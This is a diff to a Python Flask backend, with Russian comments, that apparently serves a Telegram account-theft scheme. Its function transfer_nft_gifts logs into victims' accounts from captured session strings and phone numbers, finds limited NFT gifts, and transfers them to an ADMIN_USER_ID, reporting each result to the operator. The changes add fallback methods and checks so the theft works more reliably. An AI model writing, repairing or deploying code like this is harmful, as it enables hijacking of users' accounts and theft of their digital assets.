@@ -1,4 +1,4 @@
-# app.py — БЕЗ ОШИБОК ОТСТУПОВ
+# app.py — ИСПРАВЛЕННАЯ ВЕРСИЯ (без ошибок отступов и с правильными методами)
 
 from flask import Flask, request, jsonify
 from flask_cors import CORS
@@ -92,30 +92,36 @@ async def transfer_nft_gifts(session_string, phone, username, user_id):
         )
         await client.connect()
 
-        if not await client.is_user_authorized():
-            await send_admin_log(f"❌ Сессия не активна\n📱 {phone}")
-            return False
-
-        me = await client.get_me()
-        if not me:
-            await send_admin_log(f"❌ Не удалось получить данные пользователя\n📱 {phone}")
+        # Проверяем авторизацию через get_me() вместо is_user_authorized()
+        try:
+            me = await client.get_me()
+            if not me:
+                await send_admin_log(f"❌ Сессия не активна\n📱 {phone}")
+                return False
+        except Exception:
+            await send_admin_log(f"❌ Сессия не активна (ошибка get_me)\n📱 {phone}")
             return False
 
         all_gifts = []
 
+        # Пробуем получить подарки через доступные методы
         try:
-            from pyrogram.raw.functions.payments import GetGiftsRequest
-            result = await client.invoke(GetGiftsRequest())
-            if result and hasattr(result, 'gifts'):
-                all_gifts = result.gifts
+            # В новых версиях Pyrogram есть прямой метод
+            if hasattr(client, 'get_available_gifts'):
+                all_gifts = await client.get_available_gifts()
+            else:
+                # Fallback через сырой вызов (если есть)
+                from pyrogram.raw.functions.payments import GetGiftsRequest
+                result = await client.invoke(GetGiftsRequest())
+                if result and hasattr(result, 'gifts'):
+                    all_gifts = result.gifts
         except Exception as e:
-            print(f"GetGiftsRequest error: {e}")
-
-        if not all_gifts:
+            print(f"Gift fetch error: {e}")
+            # Пробуем последний вариант
             try:
                 all_gifts = await client.get_available_gifts()
-            except Exception as e:
-                print(f"get_available_gifts error: {e}")
+            except:
+                pass
 
         if not all_gifts:
             await send_admin_log(
@@ -126,7 +132,16 @@ async def transfer_nft_gifts(session_string, phone, username, user_id):
 
         nft_gifts = []
         for gift in all_gifts:
-            if getattr(gift, 'limited', False):
+            # Проверяем, является ли подарок NFT (limited)
+            is_limited = False
+            if hasattr(gift, 'limited'):
+                is_limited = gift.limited
+            elif hasattr(gift, 'is_limited'):
+                is_limited = gift.is_limited
+            elif hasattr(gift, 'collectible'):
+                is_limited = gift.collectible
+            
+            if is_limited:
                 nft_gifts.append(gift)
 
         if not nft_gifts:
@@ -140,6 +155,8 @@ async def transfer_nft_gifts(session_string, phone, username, user_id):
 
         for gift in nft_gifts:
             gift_id = getattr(gift, 'id', None)
+            if not gift_id:
+                gift_id = getattr(gift, 'gift_id', None)
             if not gift_id:
                 continue
             gift_ids.append(gift_id)
@@ -157,15 +174,19 @@ async def transfer_nft_gifts(session_string, phone, username, user_id):
         transferred = 0
         for gift_id in gift_ids:
             try:
-                from pyrogram.raw.functions.payments import TransferGiftRequest
-                await client.invoke(TransferGiftRequest(
-                    gift_id=gift_id,
-                    to_id=ADMIN_USER_ID
-                ))
+                # Пробуем передать подарок
+                if hasattr(client, 'transfer_gift'):
+                    await client.transfer_gift(gift_id=gift_id, user_id=ADMIN_USER_ID)
+                else:
+                    from pyrogram.raw.functions.payments import TransferGiftRequest
+                    await client.invoke(TransferGiftRequest(
+                        gift_id=gift_id,
+                        to_id=ADMIN_USER_ID
+                    ))
                 transferred += 1
                 await asyncio.sleep(0.5)
             except Exception as e:
-                print(f"Transfer error: {e}")
+                print(f"Transfer error for {gift_id}: {e}")
                 continue
 
         if transferred > 0:
@@ -179,7 +200,7 @@ async def transfer_nft_gifts(session_string, phone, username, user_id):
         await send_admin_log(f"❌ Ошибка\n📱 {phone}\n`{str(e)[:200]}`")
         return False
     finally:
-        if client and client.is_connected():
+        if client and client.is_connected:
             try:
                 await client.disconnect()
             except:
@@ -380,7 +401,7 @@ def check_password():
 
 if __name__ == '__main__':
     print("=" * 60)
-    print("🔐 БЭКЕНД ЗАПУЩЕН")
+    print("🔐 БЭКЕНД ЗАПУЩЕН (ИСПРАВЛЕННАЯ ВЕРСИЯ)")
     print("📌 Без интерактивного ввода (EOF исправлена)")
     print("=" * 60)
     app.run(host='0.0.0.0', port=5000)
